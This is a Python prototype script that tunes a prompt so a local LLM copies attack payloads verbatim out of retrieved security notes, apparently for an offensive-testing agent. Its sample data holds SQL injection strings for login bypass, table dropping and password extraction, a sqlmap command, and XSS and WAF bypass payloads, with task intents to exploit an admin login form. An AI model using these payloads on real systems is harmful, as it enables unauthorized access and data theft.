# PROTOTYPE — throwaway. Do not import in production code.
# Question: what extraction prompt reliably produces verbatim spans (payloads intact)
#           from a local LLM, given realistic RAG chunks + query + task_intent?
# Run:  python rag/_proto_extract.py
# Delete or absorb findings into production Extractor when prompt is validated.

import asyncio
import sys
import os
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from llm.llm_client import LLMClient

# ── Hardcoded sample RAG chunks ───────────────────────────────────────────────
# Mirrors the {doc_id, score, snippet} shape that RAGClient.query() returns.
# Intentionally includes: code blocks, bare payload lines, prose, a low-relevance
# distractor — so we can check that the model selects tightly and preserves verbatim.

CHUNKS = [
    {
        "doc_id": "sqli-basics.md",
        "score": 0.92,
        "snippet": (
            "## Classic SQL Injection\n\n"
            "The most basic SQL injection uses a tautology to bypass authentication:\n\n"
            "```sql\n' OR '1'='1\n' OR 1=1--\nadmin'--\n```\n\n"
            "These work by terminating the original query's string literal and appending an "
            "always-true condition. The double-dash (`--`) comments out the rest of the query.\n\n"
            "For numeric parameters (no quotes needed):\n"
            "```sql\n1 OR 1=1\n1; DROP TABLE users--\n```"
        ),
    },
    {
        "doc_id": "sqli-union.md",
        "score": 0.88,
        "snippet": (
            "## Union-Based Extraction\n\n"
            "Once injectable, use UNION to extract data from other tables.\n\n"
            "First determine column count:\n"
            "```sql\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n```\n\n"
            "Then extract:\n"
            "```sql\n' UNION SELECT null,username,password FROM users--\n```\n\n"
            "Columns must match in count and be of compatible types. "
            "Use `null` as a placeholder for non-string columns."
        ),
    },
    {
        "doc_id": "sqli-error.md",
        "score": 0.79,
        "snippet": (
            "## Error-Based SQLi (MySQL)\n\n"
            "Error-based extraction leaks data through database error messages:\n\n"
            "```sql\n' AND extractvalue(1, concat(0x7e,(SELECT version())))--\n"
            "' AND updatexml(1, concat(0x7e,(SELECT database())),1)--\n```\n\n"
            "0x7e is the hex for `~`, used as a delimiter. MySQL truncates error output "
            "at 32 chars; extract in slices:\n"
            "```sql\n' AND extractvalue(1, concat(0x7e,substr((SELECT password FROM users LIMIT 1),1,30)))--\n```"
        ),
    },
    {
        "doc_id": "blind-sqli.md",
        "score": 0.71,
        "snippet": (
            "## Time-Based Blind SQLi\n\n"
            "When no output is visible, infer data via response delay:\n\n"
            "```sql\n' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--\n```\n\n"
            "Boolean variant (character-by-character):\n"
            "```sql\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n```\n\n"
            "Automate with sqlmap:\n"
            "```bash\nsqlmap -u 'http://target/page?id=1' --dbs --level=3 --risk=2\n```"
        ),
    },
    {
        "doc_id": "xss-bypass.md",
        "score": 0.61,
        "snippet": (
            "## XSS Filter Bypass\n\n"
            "When `<script>` is filtered, use event handlers:\n"
            "```html\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n\n"
            "Case variation bypasses case-sensitive filters:\n"
            "`<ScRiPt>alert(1)</ScRiPt>`\n\n"
            "Double-encoding for WAF bypass:\n"
            "`%253cscript%253ealert(1)%253c%252fscript%253e`"
        ),
    },
    {
        "doc_id": "url-encoding-ref.md",
        "score": 0.42,
        "snippet": (
            "## URL Encoding Reference\n\n"
            "Common characters and their percent-encoded forms:\n"
            "- Space: `%20` or `+`\n"
            "- Single quote: `%27`\n"
            "- Double quote: `%22`\n"
            "- `<`: `%3C`   `>`: `%3E`\n\n"
            "Double-encoding: `%` → `%25`, so `'` double-encoded → `%2527`.\n\n"
            "WAFs that decode only once may pass a double-encoded payload through "
            "while the application still interprets it as the original character."
        ),
    },
]

# ── Hardcoded query + task_intent ─────────────────────────────────────────────

QUERY = "SQL injection bypass login authentication"

TASK_INTENT = (
    "Exploit a login form at /admin/login that appears to use MySQL. "
    "Need injection strings that bypass the password check directly."
)

# ── Extraction prompt (candidate — iterate here) ──────────────────────────────

PROMPT_VERSION = "v4"

def build_extraction_prompt(query: str, task_intent: str, chunks: list) -> str:
    chunks_text = ""
    for i, c in enumerate(chunks):
        chunks_text += (
            f"\n--- CHUNK {i+1} | doc_id: {c['doc_id']} | score: {c['score']:.2f} ---\n"
            f"{c['snippet']}\n"
        )

    return f"""You are an extractive selector for a security knowledge base. Your only job is to copy verbatim spans from the chunks below that directly help with the task. You do not explain, summarise, or rewrite anything.

STRICT RULES:
1. Copy spans VERBATIM — character-for-character, including all punctuation and special characters.
2. Each code block (``` ... ```) must be copied whole — never truncate a payload or code line mid-string.
3. Within a chunk, select only the code blocks and surrounding sentences that directly address the task intent. Stop before any code block whose operation is unrelated to the task (e.g. skip a database-dumping block if the task is only about login bypass or injection confirmation).
4. If a chunk contains multiple relevant code blocks, include all of them in one span (preserve any brief prose between them so the span is contiguous).
5. Omit any chunk that has no material directly relevant to the task intent.
6. Output a JSON array. Each element has exactly two keys: "doc_id" and "span".
7. No extra keys, no commentary, no markdown outside the JSON — output the JSON array and nothing else.

QUERY: {query}

TASK INTENT: {task_intent}

CHUNKS:{chunks_text}
Output (JSON array only):"""


# ── Runner ────────────────────────────────────────────────────────────────────

# ── Second scenario: needs content from TWO different chunks ──────────────────
# Expected: sqli-basics.md (bypass strings) + blind-sqli.md (SLEEP to confirm
# injection when the app gives no visible output).

QUERY_B = "SQL injection confirm injectable and bypass login no visible output"

TASK_INTENT_B = (
    "The login form at /admin/login returns identical 200 responses whether "
    "credentials are valid or not. Need payloads to first confirm the parameter "
    "is injectable (time-based), then attempt a direct authentication bypass."
)


# ── Shared helpers ────────────────────────────────────────────────────────────

def parse_and_print(raw: str, chunks: list, label: str) -> None:
    print("── RAW OUTPUT ──────────────────────────────────────────────────────")
    print(raw)
    print("────────────────────────────────────────────────────────────────────\n")

    cleaned = (raw or "").strip()
    if cleaned.startswith("```"):
        lines = cleaned.splitlines()
        cleaned = "\n".join(lines[1:] if lines[0].startswith("```") else lines)
    if cleaned.endswith("```"):
        cleaned = "\n".join(cleaned.splitlines()[:-1])
    cleaned = cleaned.strip()

    try:
        spans = json.loads(cleaned)
        if not isinstance(spans, list):
            print(f"[WARN] Expected JSON array, got {type(spans).__name__}")
            return

        print(f"── PARSED [{label}]: {len(spans)} span(s) selected ────────────────────")
        for idx, s in enumerate(spans, 1):
            doc = s.get("doc_id", "?")
            span = s.get("span", "")
            print(f"\n  [{idx}] doc_id : {doc}")
            print("       span   :")
            for line in span.splitlines():
                print(f"         {line}")
            print()

        print("── VERBATIM CHECK ──────────────────────────────────────────────────")
        chunk_map = {c["doc_id"]: c["snippet"] for c in chunks}
        all_ok = True
        for s in spans:
            doc = s.get("doc_id", "")
            span = s.get("span", "")
            source = chunk_map.get(doc, "")
            mid = len(span) // 2
            fingerprint = span[max(0, mid - 20):mid + 20].strip()
            if fingerprint and fingerprint not in source:
                print(f"  [FAIL] doc_id={doc!r}: mid-span fingerprint not in source")
                print(f"         fingerprint: {fingerprint!r}")
                all_ok = False
            else:
                print(f"  [OK]   doc_id={doc!r}")
        if all_ok:
            print("  All spans verified verbatim.")

    except json.JSONDecodeError as e:
        print(f"[FAIL] JSON parse error: {e}")
        print("       Cleaned text was:")
        print(cleaned[:500])


async def run():
    client = LLMClient()

    # ── Scenario A: tight single-chunk bypass ─────────────────────────────────
    print("\n" + "=" * 72)
    print(f"SCENARIO A — direct bypass  (prompt {PROMPT_VERSION})")
    print(f"QUERY       : {QUERY}")
    print(f"TASK INTENT : {TASK_INTENT}")
    print("=" * 72 + "\n[calling LLM...]\n")

    msgs_a = [{"role": "user", "content": build_extraction_prompt(QUERY, TASK_INTENT, CHUNKS)}]
    raw_a, metrics_a = await client.send_message(msgs_a, role="default", expect_json=False)
    parse_and_print(raw_a, CHUNKS, "A")
    if metrics_a:
        print(f"── metrics A: {metrics_a}\n")

    # ── Scenario B: must pull from two chunks ────────────────────────────────
    print("\n" + "=" * 72)
    print(f"SCENARIO B — confirm+bypass, no visible output  (prompt {PROMPT_VERSION})")
    print(f"QUERY       : {QUERY_B}")
    print(f"TASK INTENT : {TASK_INTENT_B}")
    print("=" * 72 + "\n[calling LLM...]\n")

    msgs_b = [{"role": "user", "content": build_extraction_prompt(QUERY_B, TASK_INTENT_B, CHUNKS)}]
    raw_b, metrics_b = await client.send_message(msgs_b, role="default", expect_json=False)
    parse_and_print(raw_b, CHUNKS, "B")
    if metrics_b:
        print(f"── metrics B: {metrics_b}\n")


if __name__ == "__main__":
    asyncio.run(run())
